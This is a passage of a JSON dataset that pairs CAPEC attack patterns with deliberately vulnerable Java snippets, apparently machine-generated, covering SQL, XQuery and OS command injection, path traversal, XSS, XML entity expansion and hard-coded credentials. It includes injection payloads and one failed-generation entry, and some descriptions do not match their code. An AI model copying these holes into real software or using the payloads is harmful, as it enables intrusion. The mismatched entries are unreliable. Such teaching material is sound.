        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableCodeDownloader {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/update.jar\");\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            InputStream inputStream = connection.getInputStream();\n            FileOutputStream outputStream = new FileOutputStream(\"update.jar\");\n\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = inputStream.read(buffer)) != -1) {\n                outputStream.write(buffer, 0, bytesRead);\n            }\n\n            inputStream.close();\n            outputStream.close();\n\n            // Load and execute the downloaded code\n            Process process = Runtime.getRuntime().exec(\"java -jar update.jar\");\n            process.waitFor();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable code downloader that embodies the main idea of the CAPEC 'Sniff Application Code'. The code downloads an update file from a remote server over HTTP (cleartext transmission), saves it locally, and then executes it without performing any integrity checks. This is a clear example of CWE-319 (Cleartext Transmission of Sensitive Information), CWE-311 (Missing Encryption of Sensitive Data), and CWE-494 (Download of Code Without Integrity Check). An adversary could sniff the network traffic to capture the update file, potentially tamper with it, and exploit the trust relationship between the client and server."
    },
    {
        "capec_id": "66",
        "capec_name": "SQL Injection",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.sql.Statement;\n\npublic class SQLInjectionExample {\n    public static void main(String[] args) {\n        String userInput = \"' OR '1'='1\"; // Malicious input\n        String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n\n        try (Connection connection = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydatabase\", \"user\", \"password\");\n             Statement statement = connection.createStatement();\n             ResultSet resultSet = statement.executeQuery(query)) {\n\n            while (resultSet.next()) {\n                System.out.println(\"User: \" + resultSet.getString(\"username\"));\n            }\n        } catch (SQLException e) {\n            e.printStackTrace(); // CWE-209: Generation of Error Message Containing Sensitive Information\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a classic SQL Injection vulnerability. The code constructs an SQL query by directly concatenating user input into the query string without proper validation or neutralization of special characters (CWE-89). The user input is crafted to manipulate the SQL query, potentially allowing an attacker to bypass authentication or retrieve unauthorized data. Additionally, the code catches SQL exceptions and prints the stack trace, which can expose sensitive information about the database and application environment (CWE-209). This example highlights the importance of validating and sanitizing user inputs to prevent SQL Injection attacks."
    },
    {
        "capec_id": "67",
        "capec_name": "String Format Overflow in syslog()",
        "code_snippet": "import java.util.logging.Logger;\nimport java.util.logging.Level;\n\npublic class VulnerableSyslog {\n    private static final Logger logger = Logger.getLogger(VulnerableSyslog.class.getName());\n\n    public static void logMessage(String userInput) {\n        // CWE-134: Use of Externally-Controlled Format String\n        // CWE-20: Improper Input Validation\n        // CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component\n        // CWE-120: Buffer Copy without Checking Size of Input\n        // CWE-680: Integer Overflow to Buffer Overflow\n        // CWE-697: Incorrect Comparison\n        logger.log(Level.SEVERE, userInput); // Potentially dangerous if userInput contains format specifiers\n    }\n\n    public static void main(String[] args) {\n        if (args.length > 0) {\n            logMessage(args[0]);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to the misuse of the syslog() function, specifically focusing on the use of an externally-controlled format string (CWE-134). The `logMessage` method takes user input directly and logs it using the `Logger` class without proper validation or neutralization of special elements (CWE-20, CWE-74). This can lead to a format string injection attack, where an attacker can inject malicious format string commands. The code also implicitly highlights other related weaknesses such as buffer overflow (CWE-120, CWE-680) and incorrect comparison (CWE-697) by not validating the input size or content. The main idea is to show how improper handling of user input in logging functions can lead to severe security vulnerabilities."
    },
    {
        "capec_id": "68",
        "capec_name": "Subvert Code-signing Facilities",
        "code_snippet": "import java.security.*;\nimport java.util.Base64;\n\npublic class CodeSigningExample {\n    public static void main(String[] args) throws Exception {\n        String data = \"Sensitive Data\";\n        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\n        keyGen.initialize(2048);\n        KeyPair pair = keyGen.generateKeyPair();\n        PrivateKey privateKey = pair.getPrivate();\n        PublicKey publicKey = pair.getPublic();\n\n        // Sign the data\n        Signature signature = Signature.getInstance(\"SHA1withRSA\"); // CWE-328: Use of Weak Hash\n        signature.initSign(privateKey);\n        signature.update(data.getBytes());\n        byte[] signedData = signature.sign();\n        System.out.println(\"Signed Data: \" + Base64.getEncoder().encodeToString(signedData));\n\n        // Verify the signature\n        signature.initVerify(publicKey);\n        signature.update(data.getBytes());\n        boolean isVerified = signature.verify(signedData);\n        System.out.println(\"Signature Verified: \" + isVerified);\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of code signing and verification using RSA. The code signs a piece of data with a private key and then verifies the signature with the corresponding public key. However, it uses the SHA1withRSA algorithm, which is considered weak (CWE-328: Use of Weak Hash). This weakness can be exploited by an attacker to subvert the code-signing mechanism, potentially leading to privilege escalation as described in the CAPEC. The use of a weak hash function makes the signed data vulnerable to preimage, second preimage, and birthday attacks, undermining the integrity of the code-signing process."
    },
    {
        "capec_id": "69",
        "capec_name": "Target Programs with Elevated Privileges",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class PrivilegedCommandExecutor {\n    public static void main(String[] args) {\n        try {\n            // CWE-250: Execution with Unnecessary Privileges\n            // This program runs with elevated privileges\n            if (args.length > 0) {\n                String command = args[0];\n                // CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n                // External input is directly used in the command execution\n                Process process = Runtime.getRuntime().exec(command);\n                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    System.out.println(line);\n                }\n            } else {\n                System.out.println(\"No command provided.\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a program running with elevated privileges (CWE-250) that executes a system command provided as an external input (CWE-78). The program takes a command as an argument and executes it without proper validation or neutralization of special elements, making it vulnerable to OS command injection attacks. An attacker could exploit this vulnerability to execute arbitrary commands with elevated privileges, potentially compromising the system."
    },
    {
        "capec_id": "70",
        "capec_name": "Try Common or Default Usernames and Passwords",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class VulnerableLogin {\n    private static final Map<String, String> users = new HashMap<>();\n    private static final String DEFAULT_USERNAME = \"admin\";\n    private static final String DEFAULT_PASSWORD = \"password\";\n\n    static {\n        // Hard-coded credentials (CWE-798)\n        users.put(DEFAULT_USERNAME, DEFAULT_PASSWORD);\n    }\n\n    public static boolean login(String username, String password) {\n        // Weak password requirements (CWE-521)\n        if (password == null || password.isEmpty()) {\n            return false;\n        }\n        // Single-factor authentication (CWE-308)\n        return users.containsKey(username) && users.get(username).equals(password);\n    }\n\n    public static void main(String[] args) {\n        // Example usage\n        System.out.println(login(\"admin\", \"password\")); // true\n        System.out.println(login(\"admin\", \"wrongpassword\")); // false\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable login system that embodies the main idea of the CAPEC 'Try Common or Default Usernames and Passwords'. The code includes hard-coded credentials (CWE-798) with a default username and password, weak password requirements (CWE-521) by allowing empty passwords, and relies on single-factor authentication (CWE-308). The login method checks if the provided username and password match the hard-coded credentials, representing a common vulnerability where default credentials are not removed or changed, making it easier for attackers to gain unauthorized access."
    },
    {
        "capec_id": "71",
        "capec_name": "Using Unicode Encoding to Bypass Validation Logic",
        "code_snippet": "import java.io.UnsupportedEncodingException;\nimport java.net.URLDecoder;\n\npublic class UnicodeBypassExample {\n    public static void main(String[] args) {\n        String input = \"%3Cscript%3Ealert%281%29%3C%2Fscript%3E\"; // Encoded malicious input\n        if (isValidInput(input)) {\n            System.out.println(\"Input is valid: \" + input);\n        } else {\n            System.out.println(\"Input is invalid\");\n        }\n    }\n\n    public static boolean isValidInput(String input) {\n        // Early validation before decoding\n        if (input.contains(\"<script>\")) {\n            return false;\n        }\n        try {\n            // Decoding the input\n            String decodedInput = URLDecoder.decode(input, \"UTF-8\");\n            // Validation after decoding\n            if (decodedInput.contains(\"<script>\")) {\n                return false;\n            }\n        } catch (UnsupportedEncodingException e) {\n            e.printStackTrace();\n        }\n        return true;\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where Unicode encoding is used to bypass validation logic. The input is first validated for malicious content before decoding, which is an incorrect behavior order (CWE-179). The input is then decoded using URLDecoder, which can reveal malicious content that was not detected in the initial validation. This represents the CAPEC scenario where an attacker uses Unicode encoding to slip malicious data past the content filter. The code also highlights issues related to improper handling of Unicode encoding (CWE-176) and improper input validation (CWE-20)."
    },
    {
        "capec_id": "72",
        "capec_name": "URL Encoding",
        "code_snippet": "import java.io.UnsupportedEncodingException;\nimport java.net.URLDecoder;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class URLHandling {\n    public static void main(String[] args) {\n        String encodedUrl = \"%2E%2E%2F%2E%2E%2Fetc%2Fpasswd\"; // Encoded URL representing '../../etc/passwd'\n        try {\n            String decodedUrl = URLDecoder.decode(encodedUrl, \"UTF-8\");\n            System.out.println(\"Decoded URL: \" + decodedUrl);\n\n            // CWE-73: External Control of File Name or Path\n            if (Files.exists(Paths.get(decodedUrl))) {\n                System.out.println(\"File exists: \" + decodedUrl);\n            } else {\n                System.out.println(\"File does not exist: \" + decodedUrl);\n            }\n        } catch (UnsupportedEncodingException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to URL encoding and decoding, specifically targeting the improper handling of URL encoding (CWE-177) and external control of file name or path (CWE-73). The code decodes a URL-encoded string that represents a path traversal attack ('../../etc/passwd'). After decoding, it checks if the file exists at the decoded path. This can lead to security issues if the decoded path is used in file operations without proper validation, allowing an attacker to access sensitive files on the server. The code highlights the importance of properly handling and validating URL-encoded input to prevent such vulnerabilities."
    },
    {
        "capec_id": "73",
        "capec_name": "User-Controlled Filename",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class FileUploadServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"fileName\");\n        String fileContent = request.getParameter(\"fileContent\");\n\n        // Vulnerable code: No validation or sanitization of the file name\n        File file = new File(\"/uploads/\" + fileName);\n        try (FileWriter writer = new FileWriter(file)) {\n            writer.write(fileContent);\n        }\n\n        // Vulnerable code: Directly using the file name in HTML response\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n        out.println(\"<html><body>\");\n        out.println(\"File \" + fileName + \" uploaded successfully.\");\n        out.println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability where user-controlled input is used to create a file and generate an HTML response. The 'fileName' parameter is taken directly from the user without any validation or sanitization, leading to potential security issues such as XSS (Cross-Site Scripting) and file path manipulation. The code also directly includes the user-supplied 'fileName' in the HTML response, which can be exploited to execute malicious scripts in the client's browser. This example embodies the CAPEC 'User-Controlled Filename' and highlights related CWEs such as 'Improper Input Validation' (CWE-20), 'Improper Neutralization of Directives in Statically Saved Code' (CWE-96), and 'Improper Encoding or Escaping of Output' (CWE-116)."
    },
    {
        "capec_id": "74",
        "capec_name": "Manipulating State",
        "code_snippet": "import javax.servlet.http.Cookie;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class StateManipulationExample {\n    public void manipulateState(HttpServletRequest request, HttpServletResponse response) {\n        // CWE-315: Cleartext Storage of Sensitive Information in a Cookie\n        Cookie userCookie = new Cookie(\"user\", \"admin\");\n        response.addCookie(userCookie);\n\n        // CWE-372: Incomplete Internal State Distinction\n        String userRole = request.getParameter(\"role\");\n        if (userRole.equals(\"admin\")) {\n            // Incorrectly assuming the user is an admin\n            performAdminTasks();\n        } else {\n            performUserTasks();\n        }\n    }\n\n    private void performAdminTasks() {\n        // Admin tasks\n        System.out.println(\"Performing admin tasks\");\n    }\n\n    private void performUserTasks() {\n        // User tasks\n        System.out.println(\"Performing user tasks\");\n    }\n\n    public static void main(String[] args) {\n        // Simulate a request with manipulated state\n        HttpServletRequest request = new MockHttpServletRequest();\n        HttpServletResponse response = new MockHttpServletResponse();\n        StateManipulationExample example = new StateManipulationExample();\n        example.manipulateState(request, response);\n    }\n}\n\n// Mock classes for demonstration purposes\nclass MockHttpServletRequest implements HttpServletRequest {\n    @Override\n    public String getParameter(String name) {\n        return \"admin\"; // Simulate an attacker manipulating the state\n    }\n    // Other methods omitted for brevity\n}\n\nclass MockHttpServletResponse implements HttpServletResponse {\n    // Methods omitted for brevity\n}",
        "description": "This Java code snippet demonstrates a state manipulation vulnerability. The `manipulateState` method sets a cookie with sensitive information in cleartext (CWE-315) and incorrectly assumes the user's role based on a parameter (CWE-372). An attacker can manipulate the state by setting the 'role' parameter to 'admin', causing the application to perform admin tasks instead of user tasks. This represents the main idea of the CAPEC, where an adversary modifies state information to gain unauthorized privileges or alter the application's flow."
    },
    {
        "capec_id": "75",
        "capec_name": "Manipulating Writeable Configuration Files",
        "code_snippet": "import java.io.*;\nimport java.util.Properties;\n\npublic class ConfigManager {\n    private Properties config;\n    private File configFile;\n\n    public ConfigManager(String filePath) throws IOException {\n        configFile = new File(filePath);\n        config = new Properties();\n        loadConfig();\n    }\n\n    private void loadConfig() throws IOException {\n        try (FileInputStream fis = new FileInputStream(configFile)) {\n            config.load(fis);\n        }\n    }\n\n    public String getConfigValue(String key) {\n        return config.getProperty(key);\n    }\n\n    public void setConfigValue(String key, String value) throws IOException {\n        config.setProperty(key, value);\n        saveConfig();\n    }\n\n    private void saveConfig() throws IOException {\n        try (FileOutputStream fos = new FileOutputStream(configFile)) {\n            config.store(fos, null);\n        }\n    }\n\n    public static void main(String[] args) {\n        try {\n            ConfigManager manager = new ConfigManager(\"config.properties\");\n            manager.setConfigValue(\"username\", \"admin\");\n            System.out.println(\"Username: \" + manager.getConfigValue(\"username\"));\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple configuration manager that reads from and writes to a configuration file. The `ConfigManager` class loads configuration properties from a file, allows retrieval and modification of these properties, and saves the changes back to the file. The code embodies the main idea of CAPEC-62 (Manipulating Writeable Configuration Files) by showing how an attacker could potentially modify a configuration file to gain unauthorized access. The related CWEs are represented as follows:\n\n- CWE-349: The code does not differentiate between trusted and untrusted data when loading properties, potentially accepting malicious input.\n- CWE-99: The file path for the configuration file is taken directly from user input without validation, leading to potential resource injection.\n- CWE-77: The code does not neutralize special elements in the configuration values, which could lead to command injection if these values are used in system commands.\n- CWE-346: The code does not validate the source of the configuration file, which could be tampered with by an attacker.\n- CWE-353 and CWE-354: The code does not include or validate integrity checks for the configuration file, making it susceptible to undetected modifications."
    },
    {
        "capec_id": "76",
        "capec_name": "Manipulating Web Input to File System Calls",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class FileServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"file\");\n        File file = new File(\"/var/www/uploads/\" + fileName);\n        \n        if (file.exists() && !file.isDirectory()) {\n            FileInputStream fis = new FileInputStream(file);\n            response.setContentType(\"application/octet-stream\");\n            response.setHeader(\"Content-Disposition\", \"attachment; filename=\" + fileName);\n            \n            OutputStream os = response.getOutputStream();\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = fis.read(buffer)) != -1) {\n                os.write(buffer, 0, bytesRead);\n            }\n            fis.close();\n            os.close();\n        } else {\n            response.sendError(HttpServletResponse.SC_NOT_FOUND);\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to 'Manipulating Web Input to File System Calls'. The code takes a 'file' parameter from an HTTP GET request and uses it to construct a file path. It then attempts to serve the file to the client if it exists. The vulnerability lies in the fact that the 'file' parameter is not properly sanitized, allowing an attacker to perform a path traversal attack by including sequences like '../' in the 'file' parameter. This can lead to unauthorized access to files outside the intended directory, embodying CWE-23 (Relative Path Traversal) and CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)."
    },
    {
        "capec_id": "77",
        "capec_name": "Manipulating User-Controlled Variables",
        "code_snippet": "import java.util.Map;\n\npublic class VulnerableApp {\n    private static boolean isAdmin = false;\n\n    public static void main(String[] args) {\n        // Simulate user-controlled input\n        Map<String, String> userInput = Map.of(\"isAdmin\", \"true\");\n\n        // Vulnerable code: directly using user input to set a critical variable\n        if (userInput.containsKey(\"isAdmin\")) {\n            isAdmin = Boolean.parseBoolean(userInput.get(\"isAdmin\"));\n        }\n\n        // Business logic that depends on the isAdmin variable\n        if (isAdmin) {\n            System.out.println(\"Access granted to admin functionality.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where user-controlled input is used to directly modify a critical variable (`isAdmin`) without proper validation or sanitization. The `isAdmin` variable controls access to admin functionality, and by manipulating the input, an attacker can gain unauthorized access. This example embodies the main idea of CAPEC-137: Manipulating User-Controlled Variables, and is related to CWE-285 (Improper Authorization) and CWE-302 (Authentication Bypass by Assumed-Immutable Data)."
    },
    {
        "capec_id": "78",
        "capec_name": "Using Escaped Slashes in Alternate Encoding",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String filePath = request.getParameter(\"file\");\n        \n        // Validate input before canonicalization\n        if (filePath.contains(\"..\")) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid file path\");\n            return;\n        }\n        \n        // Canonicalize the path\n        File file = new File(filePath);\n        String canonicalPath = file.getCanonicalPath();\n        \n        // Check if the file is within the allowed directory\n        File allowedDir = new File(\"/var/www/html\");\n        if (!canonicalPath.startsWith(allowedDir.getCanonicalPath())) {\n            response.sendError(HttpServletResponse.SC_FORBIDDEN, \"Access denied\");\n            return;\n        }\n        \n        // Read and serve the file\n        try (BufferedReader reader = new BufferedReader(new FileReader(canonicalPath))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.getWriter().println(line);\n            }\n        } catch (FileNotFoundException e) {\n            response.sendError(HttpServletResponse.SC_NOT_FOUND, \"File not found\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to the CAPEC 'Using Escaped Slashes in Alternate Encoding'. The code takes a file path from a user input (HTTP request parameter) and attempts to validate it before canonicalizing it. This is a common mistake (CWE-180: Incorrect Behavior Order: Validate Before Canonicalize) that can lead to security issues such as path traversal (CWE-22: Improper Limitation of a Pathname to a Restricted Directory). An attacker could use alternate encodings or escape sequences to bypass the initial validation and access restricted files. The code also highlights improper input validation (CWE-20) and improper neutralization of special elements (CWE-74)."
    },
    {
        "capec_id": "79",
        "capec_name": "Using Slashes in Alternate Encoding",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String filePath = request.getParameter(\"file\");\n        \n        // Vulnerable to path traversal due to improper input validation and handling of alternate encoding\n        File file = new File(\"/var/www/html/\" + filePath);\n        \n        if (file.exists() && file.isFile()) {\n            FileInputStream fis = new FileInputStream(file);\n            byte[] data = new byte[(int) file.length()];\n            fis.read(data);\n            fis.close();\n            \n            response.setContentType(\"application/octet-stream\");\n            response.setContentLength(data.length);\n            response.getOutputStream().write(data);\n        } else {\n            response.sendError(HttpServletResponse.SC_NOT_FOUND);\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to 'Using Slashes in Alternate Encoding' (CAPEC-147). The code takes a 'file' parameter from the HTTP request and appends it to a base directory path. It then attempts to read and serve the file if it exists. The vulnerability arises because the code does not properly validate or canonicalize the 'file' parameter, making it susceptible to path traversal attacks. An attacker could use alternate encodings of slashes to bypass filters and access files outside the intended directory. This example also highlights related CWEs such as Improper Input Validation (CWE-20), Path Traversal (CWE-22), and Improper Handling of Alternate Encoding (CWE-173)."
    },
    {
        "capec_id": "80",
        "capec_name": "Using UTF-8 Encoding to Bypass Validation Logic",
        "code_snippet": "import java.nio.charset.StandardCharsets;\nimport java.nio.charset.Charset;\nimport java.nio.charset.CharsetDecoder;\nimport java.nio.charset.CodingErrorAction;\n\npublic class UTF8ValidationBypass {\n    public static void main(String[] args) {\n        String userInput = \"\\u00C0\\u0080\"; // Overlong encoding for null character\n        if (isValidUTF8(userInput)) {\n            // Incorrectly assuming input is safe after validation\n            System.out.println(\"Valid UTF-8 input: \" + userInput);\n        } else {\n            System.out.println(\"Invalid UTF-8 input.\");\n        }\n    }\n\n    public static boolean isValidUTF8(String input) {\n        try {\n            byte[] bytes = input.getBytes(StandardCharsets.UTF_8);\n            CharsetDecoder decoder = StandardCharsets.UTF_8.newDecoder();\n            decoder.onMalformedInput(CodingErrorAction.REPORT);\n            decoder.decode(java.nio.ByteBuffer.wrap(bytes));\n            return true;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a potential vulnerability where UTF-8 encoding is used to bypass validation logic. The `isValidUTF8` method attempts to validate if the input string is valid UTF-8. However, it does not account for overlong encodings, which can be used to encode potentially harmful input. The `userInput` string contains an overlong encoding for the null character, which should be considered invalid but may pass the validation check. This represents CWE-173 (Improper Handling of Alternate Encoding) and CWE-180 (Incorrect Behavior Order: Validate Before Canonicalize). The code highlights the risk of improper input validation when dealing with alternate encodings, as described in the CAPEC."
    },
    {
        "capec_id": "81",
        "capec_name": "Web Server Logs Tampering",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.Logger;\n\npublic class WebServerLogTampering {\n    private static final Logger logger = Logger.getLogger(WebServerLogTampering.class.getName());\n\n    public static void main(String[] args) {\n        String userInput = \"User input with malicious intent\\nInjected log entry\";\n        logUserActivity(userInput);\n    }\n\n    public static void logUserActivity(String userInput) {\n        try (FileWriter fw = new FileWriter(\"webserver.log\", true)) {\n            // CWE-117: Improper Output Neutralization for Logs\n            // CWE-93: Improper Neutralization of CRLF Sequences\n            // CWE-75: Failure to Sanitize Special Elements\n            // CWE-116: Improper Encoding or Escaping of Output\n            String sanitizedInput = userInput.replaceAll(\"\\n\", \"\\\\n\").replaceAll(\"\\r\", \"\\\\r\");\n            fw.write(\"User activity: \" + sanitizedInput + \"\\n\");\n        } catch (IOException e) {\n            logger.severe(\"Failed to write to log file: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable logging mechanism that can be exploited for web server log tampering. The `logUserActivity` method writes user input to a log file without proper sanitization, allowing an attacker to inject malicious log entries. The code attempts to sanitize the input by replacing newline characters, but it does not handle other special characters or escape sequences properly, making it susceptible to CWE-117 (Improper Output Neutralization for Logs), CWE-93 (Improper Neutralization of CRLF Sequences), CWE-75 (Failure to Sanitize Special Elements), and CWE-116 (Improper Encoding or Escaping of Output). This represents the main idea of CAPEC- Web Server Logs Tampering, where an attacker can manipulate log files to mask malicious activities or inject harmful data."
    },
    {
        "capec_id": "82",
        "capec_name": "DEPRECATED: Violating Implicit Assumptions Regarding XML Content (aka XML Denial of Service (XDoS))",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport java.io.StringReader;\nimport javax.xml.XMLConstants;\nimport javax.xml.transform.stream.StreamSource;\nimport javax.xml.validation.SchemaFactory;\nimport javax.xml.validation.Schema;\nimport javax.xml.validation.Validator;\nimport org.xml.sax.SAXException;\nimport java.io.IOException;\n\npublic class VulnerableXMLParser {\n    public static void main(String[] args) {\n        String xmlData = \"<?xml version=\\\"1.0\\\"?>\\n\" +\n                         \"<!DOCTYPE root [\\n\" +\n                         \"<!ENTITY lol 'lol'>\\n\" +\n                         \"<!ENTITY lol2 '&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;'>\\n\" +\n                         \"]>\\n\" +\n                         \"<root>&lol2;</root>\";\n\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false); // Vulnerable setting\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document document = builder.parse(new InputSource(new StringReader(xmlData)));\n            System.out.println(\"Parsed XML: \" + document.getDocumentElement().getTextContent());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that is susceptible to XML Entity Expansion (CWE-776). The code does not properly restrict recursive entity references in the Document Type Definition (DTD), which can lead to a Denial of Service (DoS) attack. The `factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false);` line explicitly disables secure processing, making the parser vulnerable to attacks such as the 'Billion Laughs' attack. This code embodies the main idea of the deprecated CAPEC by showing how improper handling of XML content can lead to security vulnerabilities."
    },
    {
        "capec_id": "83",
        "capec_name": "XPath Injection",
        "code_snippet": "User intervention needed!",
        "description": "The model failed to generate a description for this code snippet. Error: Could not parse response content as the length limit was reached - CompletionUsage(completion_tokens=4096, prompt_tokens=540, total_tokens=4636, completion_tokens_details=CompletionTokensDetails(reasoning_tokens=0))"
    },
    {
        "capec_id": "84",
        "capec_name": "XQuery Injection",
        "code_snippet": "import javax.xml.xquery.XQConnection;\nimport javax.xml.xquery.XQDataSource;\nimport javax.xml.xquery.XQException;\nimport javax.xml.xquery.XQPreparedExpression;\nimport javax.xml.xquery.XQResultSequence;\nimport net.xqj.exist.ExistXQDataSource;\n\npublic class XQueryInjectionExample {\n    public static void main(String[] args) {\n        String userInput = \"' or '1'='1\"; // Simulated malicious input\n        String xquery = \"for $user in doc('users.xml')/users/user where $user/username = '\" + userInput + \"' return $user\";\n\n        try {\n            XQDataSource xqds = new ExistXQDataSource();\n            XQConnection conn = xqds.getConnection();\n            XQPreparedExpression expr = conn.prepareExpression(xquery);\n            XQResultSequence result = expr.executeQuery();\n\n            while (result.next()) {\n                System.out.println(result.getItemAsString(null));\n            }\n        } catch (XQException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of an XQuery Injection vulnerability. The code constructs an XQuery expression using unvalidated user input, which is then executed against an XML database. The user input is directly concatenated into the XQuery string, allowing an attacker to manipulate the query structure. In this example, the user input is a simple SQL-like injection string that could potentially return all user records from the 'users.xml' file. This code highlights the risk of not properly neutralizing special elements within XQuery expressions, making it susceptible to injection attacks."
    },
    {
        "capec_id": "85",
        "capec_name": "AJAX Footprinting",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableAjaxServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        String ajaxResponse = \"<div>\" + userInput + \"</div>\";\n        response.setContentType(\"text/html\");\n        response.getWriter().write(ajaxResponse);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable implementation of an AJAX endpoint. The servlet processes a GET request, retrieves a user-provided input parameter, and directly includes it in the HTML response without any validation or sanitization. This can lead to several vulnerabilities, including Cross-Site Scripting (CWE-79) and Improper Neutralization of Input (CWE-20). The frequent client-server interactions typical of AJAX applications can be exploited by attackers to footprint the system, identifying and leveraging such vulnerabilities. The code snippet embodies the main idea of CAPEC-225 (AJAX Footprinting) by showing how an attacker can use rapid, multiple requests to discover and exploit weaknesses in the application."
    },
    {
        "capec_id": "86",
        "capec_name": "XSS Through HTTP Headers",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String referer = request.getHeader(\"Referer\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<a href='\" + referer + \"'>Click here</a>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability where user-controllable input from HTTP headers is not properly validated or sanitized before being included in the HTML output. Specifically, the 'Referer' header is directly embedded into an anchor tag without any neutralization of potentially malicious script content. This can lead to Cross-Site Scripting (XSS) attacks, as an attacker could craft a malicious 'Referer' header that includes script tags or other harmful payloads. The code snippet embodies the main idea of CAPEC-202, 'XSS Through HTTP Headers', and highlights related weaknesses such as CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-644 (Improper Neutralization of HTTP Headers for Scripting Syntax)."
    },
    {
        "capec_id": "87",
        "capec_name": "Forceful Browsing",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\n\n@WebServlet(\"/admin\")\npublic class AdminServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        HttpSession session = request.getSession(false);\n        if (session == null || session.getAttribute(\"role\") == null || !session.getAttribute(\"role\").equals(\"admin\")) {\n            response.sendError(HttpServletResponse.SC_FORBIDDEN, \"Access Denied\");\n            return;\n        }\n        // Sensitive operation\n        response.getWriter().println(\"Welcome to the admin panel!\");\n    }\n}",
